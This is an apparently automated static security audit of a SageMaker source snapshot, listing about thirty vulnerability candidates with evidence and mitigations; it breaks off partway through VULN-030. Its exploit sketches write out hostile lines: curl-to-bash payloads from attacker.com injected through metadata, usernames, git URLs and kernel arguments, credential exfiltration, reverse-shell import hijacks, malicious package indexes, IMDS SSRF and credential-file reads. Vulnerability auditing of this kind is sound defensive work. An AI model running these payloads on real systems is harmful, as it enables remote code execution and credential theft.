# SageMaker Snapshot Static Security Analysis Report

**Release:** `sagemaker-snapshot` — https://github.com/StealthyBugs/newFresh/releases/tag/sagemaker-snapshot
**Asset:** `sagemaker-source.tar.xz` (79MB compressed)
**Date:** 2026-03-02
**Methodology:** Automated static analysis using 30+ specialized agents with cross-checking

---

## PART 1: ATTACK SURFACE INVENTORY

### Frameworks & Languages Detected

| Language | Framework | Location | Role |
|----------|-----------|----------|------|
| Python | Tornado | `etc/sagemaker-inference-server/` | Inference HTTP server |
| Python | Flask | `opt/amazon/sagemaker/*/debugpy/*/flask1/app.py` | Test/debug app |
| Python | FastMCP | `etc/sagemaker-ui/sagemaker-mcp/smus-mcp.py` | stdio MCP server |
| Python | Jupyter/Tornado | `etc/sagemaker-ui/jupyter/`, `etc/jupyter/` | Jupyter notebook server |
| JavaScript | Node.js LSP | `etc/amazon-q-agentic-chat/artifacts/` | Language server |
| JavaScript | VS Code ext | `opt/amazon/sagemaker/*/extensions/` | IDE extensions |
| Bash | Shell scripts | `etc/sagemaker-ui/`, `usr/local/bin/` | Startup/config scripts |

### HTTP Endpoints Discovered

| Method | Path | Source File | Line(s) | Parameters | Auth |
|--------|------|-------------|---------|------------|------|
| POST | `/invocations` | `etc/sagemaker-inference-server/tornado_server/async_handler.py` | 31, 68-70 | body (full `self.request` passed to handler) | None |
| POST | `/invocations` | `etc/sagemaker-inference-server/tornado_server/sync_handler.py` | 32, 69-71 | body (full `self.request` passed to handler) | None |
| GET | `/ping` | `etc/sagemaker-inference-server/tornado_server/async_handler.py` | 53, 71 | None | None |
| GET | `/ping` | `etc/sagemaker-inference-server/tornado_server/sync_handler.py` | 54, 72 | None | None |
| GET | `/` | `opt/.../flask1/app.py` | 7-8 | None | None |
| GET | `/handled` | `opt/.../flask1/app.py` | 17-18 | None | None |
| GET | `/unhandled` | `opt/.../flask1/app.py` | 30-31 | None | None |
| GET | `/bad_template` | `opt/.../flask1/app.py` | 40-41 | None | None |
| GET | `/exit` | `opt/.../flask1/app.py` | 49-50 | `werkzeug.server.shutdown` via environ | None |
| GET | `*` (Jupyter) | `opt/conda/entry_point.sh` | 2 | token (query), _xsrf (cookie) | Token-based (see VULN-007) |

### Cookie Keys Influencing Behavior

| Cookie | Used By | File | Line(s) |
|--------|---------|------|---------|
| `_xsrf` | Workflow client XSRF protection | `etc/sagemaker-ui/workflows/workflow_client.py` | 23, 36, 45, 128 |
| Tornado session cookies | Jupyter server | `etc/sagemaker-ui/jupyter/server/jupyter_server_config.py` | 13 |

### Key Data Sources (Untrusted Input)

| Source | Files Consuming It | Risk Level |
|--------|-------------------|------------|
| `/opt/ml/metadata/resource-metadata.json` | `sagemaker_ui_post_startup.sh`, `network_validation.sh`, `git_clone.sh`, `git_config.sh`, `start-workflows-container.sh`, `sm-spark-cli-install.sh`, `sm_pysdk_default_config.py`, `smus-mcp.py` | HIGH — fields flow into shell commands |
| `SAGEMAKER_INFERENCE_CODE` env var | `utils/environment.py`, `tornado_server/server.py` | HIGH — controls code loading |
| `SAGEMAKER_INFERENCE_CODE_DIRECTORY` env var | `utils/environment.py`, `tornado_server/server.py` | HIGH — path traversal to code loading |
| `.libs.json` (project dir) | `etc/sagemaker-ui/libmgmt/install-lib.sh` | HIGH — controls package installation |
| AWS API responses (DataZone) | `network_validation.sh`, `git_clone.sh`, `sagemaker_ui_post_startup.sh` | HIGH — fields flow into bash -c |
| `JUPYTERSERVER_CSP_RULE` env var | `jupyter_server_config.py` | MEDIUM — controls CSP header |

---

## PART 2: VULNERABILITY CANDIDATES

### VULN-001
**Title:** Command injection via `bash -c` with unsanitized S3 bucket name / EMR application ID
**Severity:** Critical — Arbitrary command execution from API-derived data
**Type:** RCE / Command Injection
**GET-Triggerable:** No — runs at space startup. Triggered by attacker controlling DataZone project config.
**Endpoint(s):** N/A (startup script)
**Parameter(s)/Cookie(s):** `s3ValidationBucket` (line 48), `emr_app_id` (line 94)
**Evidence:**
- Source: `etc/sagemaker-ui/network_validation.sh:45-48` — `s3Path` from `resource-metadata.json`, `s3ValidationBucket` extracted via `sed`
- Source: `etc/sagemaker-ui/network_validation.sh:91-98` — `emr_arn` from AWS `list-connections` response, `emr_app_id` via `sed`
- Missing validation: No regex validation on bucket name or app ID characters
- Sink: `etc/sagemaker-ui/network_validation.sh:132` — `bash -c "${SERVICE_COMMANDS[$service]}"` executes interpolated string
**Exploit sketch:**
```
# Malicious resource-metadata.json:
{"AdditionalMetadata": {"ProjectS3Path": "s3://$(curl attacker.com/exfil?d=$(env))/path"}}
# Or malicious DataZone connection with computeArn:
"arn:aws:emr-serverless:us-east-1:123456789012:/applications/$(id>/tmp/pwned)"
```
**Mitigation:** Replace `bash -c` with direct array-based command execution; validate `s3ValidationBucket =~ ^[a-z0-9][a-z0-9.-]*$` and `emr_app_id =~ ^[a-z0-9-]+$`
**Deduplication notes:** Unique finding. Related to VULN-002 (same metadata source).

---

### VULN-002
**Title:** Command injection via `credential_process` with unsanitized DataZone domain ID
**Severity:** Critical — Persistent command injection triggered on every AWS CLI invocation
**Type:** RCE / Command Injection
**GET-Triggerable:** No — set at startup, triggers on any `aws` CLI call using the profile
**Endpoint(s):** N/A (startup script)
**Parameter(s)/Cookie(s):** `dataZoneDomainId` from `resource-metadata.json`
**Evidence:**
- Source: `etc/sagemaker-ui/sagemaker_ui_post_startup.sh:49` — `dataZoneDomainId=$(jq -r '.AdditionalMetadata.DataZoneDomainId' < $sourceMetaData)`
- Missing validation: No format check on domain ID
- Sink: `etc/sagemaker-ui/sagemaker_ui_post_startup.sh:136` — `aws configure set credential_process "sagemaker-studio credentials ... --domain-id $dataZoneDomainId ..."`
**Exploit sketch:**
```
# Metadata with: DataZoneDomainId = "dzd_abc$(curl attacker.com/shell.sh|bash)"
# Every aws CLI call with --profile DomainExecutionRoleCreds executes the injected command
```
**Mitigation:** Validate `dataZoneDomainId =~ ^dzd[-_][a-zA-Z0-9_-]{1,36}$` before use
**Deduplication notes:** Related to VULN-001 (same metadata source), distinct sink.

---

### VULN-003
**Title:** Command injection via `.bashrc` with unsanitized username from AWS API
**Severity:** Critical — Persistent RCE on every shell login
**Type:** RCE / Command Injection
**GET-Triggerable:** No — set at startup, triggers on terminal open
**Endpoint(s):** N/A (startup script)
**Parameter(s)/Cookie(s):** `username` from `aws datazone get-user-profile` response
**Evidence:**
- Source: `etc/sagemaker-ui/sagemaker_ui_post_startup.sh:157` — `username=$(echo "$arn" | awk -F'/' '{print $NF}')` or line 162: `username=$(echo "$response" | jq -r '.details.sso.username')`
- Missing validation: No character validation on username
- Sink: `etc/sagemaker-ui/sagemaker_ui_post_startup.sh:241` — `echo LOGNAME=$username >> ~/.bashrc` (unquoted)
**Exploit sketch:**
```
# SSO username set to: "evil; curl attacker.com/x|bash #"
# .bashrc gets: LOGNAME=evil; curl attacker.com/x|bash #
# Executes on every terminal open
```
**Mitigation:** Quote the variable: `echo "LOGNAME=\"$username\"" >> ~/.bashrc`; validate username characters
**Deduplication notes:** Related to VULN-002, distinct sink (.bashrc vs credential_process).

---

### VULN-004
**Title:** Command injection in git credential helper via unsanitized region
**Severity:** High — RCE on every git operation to CodeCommit
**Type:** RCE / Command Injection
**GET-Triggerable:** No — triggers on git fetch/push
**Endpoint(s):** N/A (git config)
**Parameter(s)/Cookie(s):** `dataZoneDomainRegion` from `resource-metadata.json`
**Evidence:**
- Source: `etc/sagemaker-ui/git_config.sh:5` — `dataZoneDomainRegion=$(jq -r '.AdditionalMetadata.DataZoneDomainRegion' < $sourceMetaData)`
- Missing validation: No format check
- Sink: `etc/sagemaker-ui/git_config.sh:8` — `git config --global credential.helper "!aws ... --region $dataZoneDomainRegion ..."`
**Exploit sketch:**
```
# Metadata: DataZoneDomainRegion = "us-east-1; curl attacker.com/shell.sh | bash #"
# Any git operation to codecommit triggers shell execution
```
**Mitigation:** Validate `dataZoneDomainRegion =~ ^[a-z]{2}-[a-z]+-[0-9]+$`
**Deduplication notes:** Same metadata source as VULN-001/002, distinct injection vector.

---

### VULN-005
**Title:** Arbitrary code execution via dynamic Python module loading from env-controlled path
**Severity:** High — Full code execution at inference server startup
**Type:** Code Injection / Path Traversal
**GET-Triggerable:** No (startup) — but loaded handler serves HTTP requests on `/invocations`
**Endpoint(s):** Indirectly `/invocations` (POST)
**Parameter(s)/Cookie(s):** `SAGEMAKER_INFERENCE_CODE`, `SAGEMAKER_INFERENCE_CODE_DIRECTORY` env vars
**Evidence:**
- Source: `etc/sagemaker-inference-server/utils/environment.py:28-29` — `os.getenv()` for CODE_DIRECTORY and CODE
- Missing validation: No path traversal check, no module name format validation
- Sink: `etc/sagemaker-inference-server/tornado_server/server.py:105-111` — `importlib.util.spec_from_file_location()` + `module_spec.loader.exec_module(module)`
- Path traversal: `server.py:42-44` — `Path(base).joinpath(code_directory)` allows `..` traversal
**Exploit sketch:**
```
SAGEMAKER_INFERENCE_CODE_DIRECTORY=../../tmp/evil
SAGEMAKER_INFERENCE_CODE=payload.handler
# Loads and executes /opt/ml/model/../../tmp/evil/payload.py
```
**Mitigation:** Validate resolved path stays under base_directory with `is_relative_to()`; validate CODE matches `^[a-zA-Z_][a-zA-Z0-9_]*\.[a-zA-Z_][a-zA-Z0-9_]*$`
**Deduplication notes:** Unique to inference server.

---

### VULN-006
**Title:** Jupyter server running as root on 0.0.0.0 with `--allow-root`
**Severity:** Critical — Full root access to anyone who can reach port 8888
**Type:** Other Injection (Privilege Escalation / Misconfiguration)
**GET-Triggerable:** Yes — all Jupyter endpoints accessible via GET from any network host
**Endpoint(s):** `GET *` on port 8888
**Parameter(s)/Cookie(s):** None required if unauthenticated
**Evidence:**
- Source/Sink: `opt/conda/entry_point.sh:2` — `python3 -m jupyter notebook --allow-root --ip=0.0.0.0 --port=8888`
- No `--token` or `--password` flag specified
**Exploit sketch:**
```
# From any host on the network:
curl http://<target>:8888/api/contents/.aws/credentials
# Or open terminal: POST /api/terminals → root bash shell
```
**Mitigation:** Run as non-root user; bind to 127.0.0.1; enforce authentication token
**Deduplication notes:** Compounds with VULN-007, VULN-008, VULN-009.

---

### VULN-007
**Title:** Missing authentication token in Jupyter server configuration
**Severity:** High — Potentially unauthenticated access to Jupyter server
**Type:** Other Injection (Authentication Bypass)
**GET-Triggerable:** Yes — if no token, all endpoints are open
**Endpoint(s):** `GET *` on Jupyter
**Parameter(s)/Cookie(s):** `token` query parameter
**Evidence:**
- Missing config: No `c.ServerApp.token`, `c.IdentityProvider.token`, or `c.NotebookApp.token` in any of: `etc/sagemaker-ui/jupyter/server/jupyter_server_config.py`, `etc/jupyter/jupyter_server_config.py`, `opt/conda/etc/jupyter/jupyter_server_config.py`
- Note: A `SagemakerIdentityProvider` is referenced in a separate extension config, but if that extension fails to load, there is no fallback authentication
**Exploit sketch:**
```
# Navigate to http://<host>:8888 — no token needed
# Access /api/contents, /api/kernels, /api/terminals
```
**Mitigation:** Explicitly configure `c.ServerApp.token` with a strong random value in the main config
**Deduplication notes:** Compounds with VULN-006.

---

### VULN-008
**Title:** Hidden file access enabled exposes .aws credentials, .ssh keys, .env secrets
**Severity:** High — Credential theft via Jupyter Contents API
**Type:** Other Injection (Information Disclosure)
**GET-Triggerable:** Yes — `GET /api/contents/.aws/credentials`
**Endpoint(s):** `GET /api/contents/<hidden_path>`
**Parameter(s)/Cookie(s):** Path parameter in URL
**Evidence:**
- Config: `etc/sagemaker-ui/jupyter/server/jupyter_server_config.py:24` — `c.ContentsManager.allow_hidden = True`
- Config: `etc/jupyter/jupyter_server_config.py:16` — same setting
- Combined with root execution (VULN-006), can access any user's hidden files
**Exploit sketch:**
```
GET /api/contents/.aws/credentials?type=file&format=text
GET /api/contents/.ssh/id_rsa?type=file&format=text
GET /api/contents/.bash_history?type=file&format=text
```
**Mitigation:** Set `c.ContentsManager.allow_hidden = False` or implement path allowlisting
**Deduplication notes:** Amplified by VULN-006 (root) and VULN-007 (no auth).

---

### VULN-009
**Title:** CSP header null/injectable when JUPYTERSERVER_CSP_RULE env var is unset or controlled
**Severity:** High — XSS protection completely absent
**Type:** XSS (CSP Bypass)
**GET-Triggerable:** Yes — every Jupyter HTTP response affected
**Endpoint(s):** All Jupyter endpoints
**Parameter(s)/Cookie(s):** N/A (response header)
**Evidence:**
- Source: `etc/sagemaker-ui/jupyter/server/jupyter_server_config.py:11` — `csp_rule = os.environ.get("JUPYTERSERVER_CSP_RULE")`
- Sink: `etc/sagemaker-ui/jupyter/server/jupyter_server_config.py:13` — `"Content-Security-Policy": csp_rule` (None if unset)
- Fallback config `etc/jupyter/jupyter_server_config.py:5` has NO CSP at all
**Exploit sketch:**
```
# If env var unset: CSP header = None → browser ignores → all XSS vectors work
# If attacker controls env: JUPYTERSERVER_CSP_RULE="default-src * 'unsafe-inline' 'unsafe-eval'"
```
**Mitigation:** Provide a strict default CSP; validate env var format
**Deduplication notes:** Enables exploitation of any XSS found in Jupyter.

---

### VULN-010
**Title:** Git clone with attacker-controlled URL enables ext:: transport RCE
**Severity:** High — RCE via malicious git remote URL
**Type:** RCE / Command Injection
**GET-Triggerable:** No — runs at startup
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** `cloneUrl`, `gitBranchName` from `sagemaker-studio git get-clone-url` API
**Evidence:**
- Source: `etc/sagemaker-ui/git_clone.sh:37` — `cloneUrl=$(echo "$response" | jq -r '.cloneUrl')`
- Source: `etc/sagemaker-ui/git_clone.sh:41` — `gitBranchName` from API response
- Sink: `etc/sagemaker-ui/git_clone.sh:52` — `git clone "$cloneUrl" $DESTINATION_PATH -b "$gitBranchName"`
**Exploit sketch:**
```
# Malicious cloneUrl: "ext::sh -c curl%20attacker.com/payload.sh|bash%20>&2"
# git clone invokes the ext:: transport handler → shell execution
```
**Mitigation:** Validate cloneUrl starts with `https://`; validate gitBranchName `=~ ^[a-zA-Z0-9._/-]+$`
**Deduplication notes:** Unique vector via git ext:: transport.

---

### VULN-011
**Title:** Arbitrary package installation from user-controlled .libs.json
**Severity:** High — Supply chain attack via malicious conda channel
**Type:** RCE / Code Injection (Supply Chain)
**GET-Triggerable:** No — runs at startup
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** `.libs.json` file in project directory
**Evidence:**
- Source: `etc/sagemaker-ui/libmgmt/install-lib.sh:6` — `cat $PROJECT_DIR/.libs.json`
- Source: `install-lib.sh:10` — conda channels from JSON via `jq -r`
- Source: `install-lib.sh:12` — package specs from JSON via `jq -r`
- Missing validation: No channel allowlist, no package name validation
- Sink: `install-lib.sh:16` — `micromamba install --freeze-installed -y $conda_channels $conda_package` (unquoted)
**Exploit sketch:**
```json
{"ApplyChangeToSpace": "true", "Python": {"CondaPackages": {
  "Channels": ["https://attacker.com/conda-channel"],
  "PackageSpecs": ["backdoor-package"]}}}
```
**Mitigation:** Allowlist conda channels; quote variable expansions; validate package names
**Deduplication notes:** Unique supply chain vector.

---

### VULN-012
**Title:** Arbitrary package installation via requirements.txt in model artifacts
**Severity:** High — Supply chain RCE via malicious pip packages
**Type:** RCE / Code Injection (Supply Chain)
**GET-Triggerable:** No — runs at server startup
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** `requirements.txt` in model directory
**Evidence:**
- Sink: `etc/sagemaker-inference-server/tornado_server/server.py:86` — `subprocess.check_call(["micromamba", "install", "--yes", "--file", str(requirements_txt)])`
- Sink: `server.py:92` — `subprocess.check_call(["pip", "install", "-r", str(requirements_txt)])` (fallback)
- No validation of requirements file contents; `--index-url` injection possible
**Exploit sketch:**
```
# requirements.txt:
--index-url https://evil-pypi.attacker.com/simple/
torch==2.0.0
```
**Mitigation:** Validate/sanitize requirements file; use `--require-hashes`; pin trusted index
**Deduplication notes:** Related to VULN-005 (same server), different attack vector.

---

### VULN-013
**Title:** sys.path poisoning enables Python import hijacking
**Severity:** Medium — Code execution via shadow module in model directory
**Type:** Code Injection
**GET-Triggerable:** No — startup-time
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** Files in model directory
**Evidence:**
- Sink: `etc/sagemaker-inference-server/tornado_server/server.py:109` — `sys.path.insert(0, str(self._path_to_inference_code.resolve()))`
- Sink: `etc/sagemaker-inference-server/tornado_server/__init__.py:7-12` — Two more `sys.path.insert(0, ...)` calls
- Insert at position 0 means attacker directory takes priority over stdlib
**Exploit sketch:**
```
# Place /opt/ml/model/code/json.py:
import subprocess; subprocess.Popen(["bash","-c","reverse_shell"])
from _json import *  # re-export to avoid breakage
```
**Mitigation:** Append to sys.path instead of insert(0); validate no stdlib shadow files exist
**Deduplication notes:** Related to VULN-005, distinct mechanism.

---

### VULN-014
**Title:** Unsanitized Tornado response with default text/html Content-Type
**Severity:** Medium — Reflected XSS if handler echoes input
**Type:** XSS
**GET-Triggerable:** No — /invocations is POST-only
**Endpoint(s):** `POST /invocations`
**Parameter(s)/Cookie(s):** Request body
**Evidence:**
- Sink: `etc/sagemaker-inference-server/tornado_server/async_handler.py:42` — `self.write(response)`
- Sink: `etc/sagemaker-inference-server/tornado_server/sync_handler.py:43` — `self.write(response)`
- Tornado defaults to `Content-Type: text/html; charset=UTF-8` for string responses
- No `X-Content-Type-Options: nosniff` header set
**Exploit sketch:**
```
POST /invocations HTTP/1.1
Content-Type: text/plain

<script>alert(document.cookie)</script>
# If handler echoes input → XSS in any browser rendering the response
```
**Mitigation:** Set `Content-Type: application/json` or `application/octet-stream`; add `X-Content-Type-Options: nosniff`
**Deduplication notes:** Unique to inference server.

---

### VULN-015
**Title:** Missing CSRF protection on Tornado inference server
**Severity:** Low — POST endpoint lacks XSRF token verification
**Type:** Other Injection (CSRF)
**GET-Triggerable:** No — requires POST from browser
**Endpoint(s):** `POST /invocations`
**Parameter(s)/Cookie(s):** No XSRF cookie/header required
**Evidence:**
- Config: `async_handler.py:68-73` — `tornado.web.Application([...])` created without `xsrf_cookies=True`
- No custom CSRF middleware
**Exploit sketch:**
```html
<form action="http://localhost:8080/invocations" method="POST" id="csrf">
  <input type="hidden" name="data" value="malicious">
</form><script>document.getElementById('csrf').submit()</script>
```
**Mitigation:** Enable `xsrf_cookies=True` in Application settings
**Deduplication notes:** Unique to inference server.

---

### VULN-016
**Title:** No request body size limit on inference endpoint
**Severity:** Medium — Memory exhaustion DoS
**Type:** Other Injection (DoS)
**GET-Triggerable:** No — requires POST
**Endpoint(s):** `POST /invocations`
**Parameter(s)/Cookie(s):** Request body
**Evidence:**
- Config: `async_handler.py:68` / `sync_handler.py:69` — Application created with no `max_body_size` setting
- Tornado default is ~100MB which is excessive for inference payloads
**Exploit sketch:**
```
# Send 100MB POST body to exhaust server memory
curl -X POST http://target:8080/invocations -d "$(dd if=/dev/zero bs=1M count=100)"
```
**Mitigation:** Set explicit `max_body_size` appropriate for expected payloads
**Deduplication notes:** Unique to inference server.

---

### VULN-017
**Title:** No authentication on Tornado inference server
**Severity:** Medium — Any network-reachable client can invoke inference
**Type:** Other Injection (Authentication Bypass)
**GET-Triggerable:** Yes for /ping (GET); No for /invocations (POST)
**Endpoint(s):** `GET /ping`, `POST /invocations`
**Parameter(s)/Cookie(s):** None
**Evidence:**
- No auth middleware: `async_handler.py:68-73` — routes defined without any authentication handler
- No API key checking in any handler method
**Exploit sketch:**
```
curl http://target:8080/ping  # No auth needed
curl -X POST http://target:8080/invocations -d '{"input":"data"}'
```
**Mitigation:** Add API key or token authentication middleware
**Deduplication notes:** Separate service from Jupyter (VULN-007).

---

### VULN-018
**Title:** SSRF via attacker-controlled DataZone endpoint_url in boto3
**Severity:** High — Redirect all AWS API calls to attacker server
**Type:** Other Injection (SSRF)
**GET-Triggerable:** No — startup/CLI
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** `endpoint` CLI arg / `DataZoneEndpoint` from metadata
**Evidence:**
- Source: `etc/sagemaker-ui/workflows/workflow_client.py:54` — `boto3.client("datazone", endpoint_url=endpoint)` where `endpoint` from CLI
- Source: `etc/sagemaker-ui/sagemaker_ui_post_startup.sh:92` — `--endpoint-url "$dataZoneEndPoint"` from metadata
- Source: `etc/sagemaker-ui/network_validation.sh:53` — same pattern
- No URL validation or allowlisting
**Exploit sketch:**
```
# Metadata: DataZoneEndpoint = "http://169.254.169.254/latest/meta-data/"
# → IMDS credential theft via SSRF
# Or: DataZoneEndpoint = "https://attacker.com/capture-creds"
```
**Mitigation:** Validate endpoint URL against allowlist of known AWS endpoints
**Deduplication notes:** Unique SSRF vector affecting multiple scripts.

---

### VULN-019
**Title:** Download and execute as root with no integrity verification (sm-spark-cli)
**Severity:** Critical — Full root compromise via supply chain
**Type:** RCE / Code Injection
**GET-Triggerable:** No — startup
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** N/A
**Evidence:**
- Sink: `etc/sagemaker-ui/workflows/sm-spark-cli-install.sh:12` — `sudo curl -LO https://github.com/aws-samples/.../amazon-sagemaker-spark-ui.tar.gz`
- Sink: `sm-spark-cli-install.sh:13` — `sudo tar -xvzf amazon-sagemaker-spark-ui.tar.gz`
- Sink: `sm-spark-cli-install.sh:14-15` — `sudo chmod +x ...install-history-server.sh && sudo ...install-history-server.sh`
- No checksum, no signature verification
**Exploit sketch:**
```
# Compromised GitHub release or MITM → malicious tarball
# tar extract overwrites files (absolute path or symlink attack)
# Shell script runs as root → full system compromise
```
**Mitigation:** Verify SHA256 checksum of downloaded archive; use pinned tag with hash
**Deduplication notes:** Unique supply chain vector.

---

### VULN-020
**Title:** Command injection via unvalidated kernel launcher arguments
**Severity:** Critical — Direct RCE via exec with unquoted variables
**Type:** RCE / Command Injection
**GET-Triggerable:** Maybe — if Jupyter kernel creation accepts user-controlled kernel_type
**Endpoint(s):** Jupyter kernel launch
**Parameter(s)/Cookie(s):** Positional args $2 (kernel_type) and $4 (connection_file)
**Evidence:**
- Source: `etc/sagemaker-ui/kernels/kernel_launchers/python3_kernel_launcher.sh:3-4` — `kernel_type=$2`, `connection_file=$4`
- Missing validation: No validation of either parameter
- Sink: `python3_kernel_launcher.sh:51` — `exec /opt/conda/bin/python -m ${kernel_type} -f ${connection_file}` (both unquoted)
**Exploit sketch:**
```
# kernel_type = "os;curl attacker.com/shell.sh|bash #"
# → exec /opt/conda/bin/python -m os;curl attacker.com/shell.sh|bash # -f <file>
```
**Mitigation:** Quote variables; validate kernel_type against allowlist; validate connection_file is a valid path
**Deduplication notes:** Unique to kernel launcher.

---

### VULN-021
**Title:** Root bash terminal access via Jupyter terminado
**Severity:** High — Interactive root shell for any authenticated user
**Type:** Other Injection (Privilege Escalation)
**GET-Triggerable:** No — requires POST + WebSocket; trivial via XSS chain
**Endpoint(s):** `POST /api/terminals`
**Parameter(s)/Cookie(s):** None beyond auth
**Evidence:**
- Config: `etc/sagemaker-ui/jupyter/server/jupyter_server_config.py:9` — `c.ServerApp.terminado_settings = {"shell_command": ["/bin/bash"]}`
- Combined with VULN-006 (root execution): terminal gives root bash
**Exploit sketch:**
```
# POST /api/terminals → creates terminal
# WebSocket /terminals/websocket/1 → interactive root bash
# Via XSS: fetch('/api/terminals',{method:'POST'}).then(...)
```
**Mitigation:** Run Jupyter as non-root; restrict terminal access via extensions
**Deduplication notes:** Compounds with VULN-006.

---

### VULN-022
**Title:** Permanent recursive deletion of non-empty directories via Jupyter API
**Severity:** Medium — Data destruction with no recovery
**Type:** Other Injection (Data Destruction)
**GET-Triggerable:** No — requires DELETE method; XSS chain possible
**Endpoint(s):** `DELETE /api/contents/<path>`
**Parameter(s)/Cookie(s):** Path parameter
**Evidence:**
- Config: `etc/sagemaker-ui/jupyter/server/jupyter_server_config.py:16` — `c.FileContentsManager.delete_to_trash = False`
- Config: `jupyter_server_config.py:20` — `c.FileContentsManager.always_delete_dir = True`
**Exploit sketch:**
```javascript
// XSS payload: permanently delete project
fetch('/api/contents/src', {method: 'DELETE', headers: {'X-XSRFToken': getCookie('_xsrf')}})
```
**Mitigation:** Enable trash; disable `always_delete_dir`; add confirmation for recursive delete
**Deduplication notes:** Amplified by VULN-009 (no CSP → easy XSS).

---

### VULN-023
**Title:** BREACH attack vector via Tornado response compression over TLS
**Severity:** Low — Side-channel token theft
**Type:** Other Injection (Side Channel)
**GET-Triggerable:** Yes — passive attack against compressed HTTPS responses
**Endpoint(s):** All Jupyter endpoints
**Parameter(s)/Cookie(s):** XSRF token reflected in responses
**Evidence:**
- Config: `etc/sagemaker-ui/jupyter/server/jupyter_server_config.py:13` — `"compress_response": True`
- Config: `etc/jupyter/jupyter_server_config.py:5` — same
**Mitigation:** Disable compression or add random padding to responses containing secrets
**Deduplication notes:** Unique side-channel.

---

### VULN-024
**Title:** Silent exception swallowing hides security errors
**Severity:** Low — Anti-forensics / error masking
**Type:** Other Injection (Information Disclosure)
**GET-Triggerable:** No
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** N/A
**Evidence:**
- `etc/sagemaker-ui/jupyter/server/jupyter_server_config.py:35` — `except: pass`
- `etc/jupyter/jupyter_server_config.py:27` — `except: pass`
- `etc/sagemaker-ui/workflows/workflow_client.py:76` — `except:` catches all
- `etc/sagemaker-ui/workflows/workflow_client.py:87` — `except:` catches all
**Mitigation:** Use specific exception types; log errors
**Deduplication notes:** Pattern repeated across multiple files.

---

### VULN-025
**Title:** AWS CLI --debug flag leaks credentials and internal endpoints
**Severity:** High — Information disclosure of auth signatures and API responses
**Type:** Other Injection (Information Disclosure)
**GET-Triggerable:** No — startup script
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** N/A
**Evidence:**
- Sink: `etc/sagemaker-ui/sagemaker_ui_post_startup.sh:92` — `aws datazone get-domain --debug ... 2>&1`
- `--debug` outputs full HTTP headers including AWS SigV4 authorization
- Combined with `set -eux` (line 2), all variable values echo to stdout/stderr
**Exploit sketch:**
```
# Debug output contains:
# Authorization: AWS4-HMAC-SHA256 Credential=AKIA.../20260302/us-east-1/datazone/aws4_request, ...
# Any log aggregation captures these temporary credentials
```
**Mitigation:** Remove `--debug` flag; parse response body via normal `--output json`
**Deduplication notes:** Unique info disclosure.

---

### VULN-026
**Title:** Credential exposure window between set +x / set -x
**Severity:** Medium — Temporary credential leak if tracing re-enabled early
**Type:** Other Injection (Information Disclosure)
**GET-Triggerable:** No
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** Domain execution role credentials
**Evidence:**
- `etc/sagemaker-ui/sagemaker_ui_post_startup.sh:124` — `set +x`
- `sagemaker_ui_post_startup.sh:127` — credential fetch
- `sagemaker_ui_post_startup.sh:130` — `set -x`
**Mitigation:** Never enable `set -x` when credentials may be in scope
**Deduplication notes:** Related to VULN-025.

---

### VULN-027
**Title:** Dynamic __import__ with bare except enables import hijacking
**Severity:** Medium — Arbitrary code execution at Jupyter startup
**Type:** Code Injection
**GET-Triggerable:** No — server startup
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** N/A
**Evidence:**
- Sink: `etc/sagemaker-ui/jupyter/server/jupyter_server_config.py:32` — `module = __import__("amazon_sagemaker_sql_editor")`
- Sink: `etc/jupyter/jupyter_server_config.py:24` — same
- CWD (user's home dir) is in Python path → attacker can place shadow module
- Bare `except: pass` on lines 35/27 hides hijacking errors
**Exploit sketch:**
```python
# Place ~/amazon_sagemaker_sql_editor/__init__.py:
import os; os.system("curl attacker.com/exfil?$(cat ~/.aws/credentials|base64)")
```
**Mitigation:** Use absolute import path; remove bare except; validate module location
**Deduplication notes:** Unique import hijacking vector.

---

### VULN-028
**Title:** Unquoted $VSCODE_GIT_ASKPASS_EXTRA_ARGS and $* in askpass scripts
**Severity:** High — Command injection via git askpass
**Type:** RCE / Command Injection
**GET-Triggerable:** No — triggers during git credential prompts
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** `VSCODE_GIT_ASKPASS_EXTRA_ARGS` env var, script arguments
**Evidence:**
- Sink: `opt/conda/share/sagemaker-code-editor/extensions/git/dist/askpass.sh:3` — `$VSCODE_GIT_ASKPASS_EXTRA_ARGS $*` (both unquoted)
- Sink: `opt/conda/share/sagemaker-code-editor/extensions/git/dist/ssh-askpass.sh:3` — identical pattern
**Exploit sketch:**
```
VSCODE_GIT_ASKPASS_EXTRA_ARGS="; curl attacker.com/x |bash #"
# Triggers during any git operation requiring password
```
**Mitigation:** Quote all variables: `"$VSCODE_GIT_ASKPASS_EXTRA_ARGS" "$@"`
**Deduplication notes:** Two files, same vulnerability.

---

### VULN-029
**Title:** Pip install from world-writable /tmp/ in rsession gateway setup
**Severity:** High — Code execution via /tmp/ file replacement
**Type:** RCE / Code Injection
**GET-Triggerable:** No — build-time script
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** Files in `/tmp/`
**Evidence:**
- Sink: `opt/.sagemakerinternal/conda/install-scripts/605_bake_rsession_gateway.sh:24` — `pip install "$RSESSION_GATEWAY_TAR"` where path defaults to `/tmp/looseleaf_rsession_gateway/...`
- Sink: `605_bake_rsession_gateway.sh:27-30` — `cp /tmp/rsession_variant ${CONDA_DIR}/` + `sudo chmod 755`
**Exploit sketch:**
```
# Pre-place malicious tarball at /tmp/looseleaf_rsession_gateway/sagemaker_rsession_gateway-1.0.tar.gz
# Or symlink /tmp/rsession_variant → malicious binary
# Script copies and chmod 755 → malicious executable installed
```
**Mitigation:** Use `mktemp -d` with restricted permissions; verify file checksums
**Deduplication notes:** Unique to rsession gateway.

---

### VULN-030
**Title:** Source command with env-controlled CONDA_DIR path
**Severity:** High — Arbitrary code execution via environment variable
**Type:** Code Injection
**GET-Triggerable:** No — build/install time
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** `CONDA_DIR` env var
**Evidence:**
- Sink: `opt/.sagemakerinternal/conda/install-scripts/605_bake_rsession_gateway.sh:22` — `source ${CONDA_DIR}/bin/activate base` (unquoted)
